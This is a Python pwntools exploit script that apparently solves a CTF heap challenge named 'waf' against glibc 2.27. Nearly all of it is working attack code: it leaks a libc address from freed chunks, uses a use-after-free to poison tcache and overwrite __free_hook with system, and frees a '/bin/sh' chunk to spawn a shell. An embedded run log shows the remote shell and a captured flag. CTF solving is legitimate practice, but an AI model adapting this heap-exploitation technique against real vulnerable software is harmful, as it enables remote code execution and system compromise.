#!/usr/bin/python

from pwn import *

ELF_PATH = './waf'

elf  = ELF(ELF_PATH, 0)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)

gdbscript = ''''''

"""
[+] Opening connection to challenge.ctf.games on port 31213: Done
[*] leak 0x7f6fb0456ca0
[*] libc 0x7f6fb006b000
[*] Switching to interactive mode
$ ls -l
total 48
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 bin
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib64
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 usr
---x--x--x 1 root 0 17344 Dec 28 17:46 waf
$ cat flag.txt
flag{dc75c408f5ba2fbc72b307987dddc775}
$ 
[*] Interrupted
[*] Closed connection to challenge.ctf.games port 31213
"""

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def add(id, size, data, isactive="y"):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(id))
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', str(data))
    r.sendlineafter(': ', isactive)

def edit(idx, id, size, data, isactive="y"):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(id))
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', str(data))
    r.sendlineafter(': ', isactive)

def view(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))
    r.recvline(0)
    arr = []
    for _ in range(3):
        arr.append(r.recvline(0).split(": ")[1])
    return arr

def delete_last():
    r.sendlineafter('> ', '4')

def exploit(r):
    for i in range(8):
        add(i, 0x80, "a"*8)

    for i in range(8):
        delete_last()

    leak = u64(view(0)[1].ljust(8, '\0'))
    libc.address = leak - 4111520

    info("leak 0x%x", leak)
    info("libc 0x%x", libc.address)
    
    # just for clean bins. actually just need 1 freed chunk -> edit (uaf)
    for i in range(8):
        add(i, 0x80, "a"*8)

    delete_last() # 7

    edit(7, 1337, 0x80, p64(libc.sym['__free_hook']+1)*2)
    add(8, 0xc0, "d"*64) # need this
    add(9, 0xc0, p64(libc.sym['system']))
    add(10, 0x8, "/bin/sh")

    delete_last()

    # debug(gdbscript)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)